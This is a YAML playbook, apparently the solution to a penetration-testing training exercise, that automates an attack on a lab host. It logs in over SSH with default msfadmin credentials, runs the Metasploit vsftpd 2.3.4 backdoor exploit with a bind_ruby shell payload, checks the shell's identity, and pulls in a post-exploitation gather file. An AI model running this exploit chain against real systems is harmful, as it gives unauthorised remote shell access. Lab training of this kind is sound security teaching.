#
# Exercise 4 Solution: Modular Playbooks with Include
#

vars:
  TARGET: 172.17.0.106
  ATTACKER: 172.17.0.127
  INCLUDE_PATH: ./includes

commands:
  # ============================================
  # PHASE 0: Preparation
  # ============================================
  # Because the vsftpd exploit leaves a running process on the target, we will clean
  # it up every time before trying again.
  #
  - type: ssh
    hostname: $TARGET
    username: msfadmin
    password: msfadmin
    cmd: "echo msfadmin | sudo -S -p 'msfadmin' fuser -k 6200/tcp 2>/dev/null"
  # PHASE 1: Exploitation

  - type: msf-module
    cmd: exploit/unix/ftp/vsftpd_234_backdoor
    payload: cmd/unix/bind_ruby
    options:
      RHOSTS: $TARGET
    creates_session: shell

  - type: msf-session
    session: shell
    cmd: id

  - type: debug
    cmd: "Shell identity: $RESULT_STDOUT"

  # PHASE 2: Prepare Include Variables

  - type: setvar
    variable: GATHER_SESSION
    cmd: $LAST_MSF_SESSION

  # PHASE 3: Include Post-Exploitation

  - type: include
    local_path: $INCLUDE_PATH/gather_commands.yml
